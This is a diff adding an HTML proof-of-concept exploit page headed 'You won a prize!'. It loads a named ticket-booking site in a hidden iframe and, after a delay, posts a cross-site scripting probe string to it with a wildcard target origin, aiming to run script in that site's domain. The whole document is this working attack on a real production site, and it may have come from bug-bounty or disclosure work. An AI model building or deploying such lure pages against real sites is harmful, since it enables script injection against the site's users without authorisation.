@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>You won a prize!</h1>
+    <iframe id="targetApp" src="http://www.district.in/events/ipl-ticket-booking" style="display:none;"></iframe>
+    
+    <script>
+        // Wait for the iframe to load, then fire the payload
+        setTimeout(function() {
+            var target = document.getElementById('targetApp').contentWindow;
+            // The '*' allows the message to be sent regardless of target origin
+            target.postMessage("'-alert(document.domain)-'", '*');
+        }, 3000);
+    </script>
+</body>
+</html>
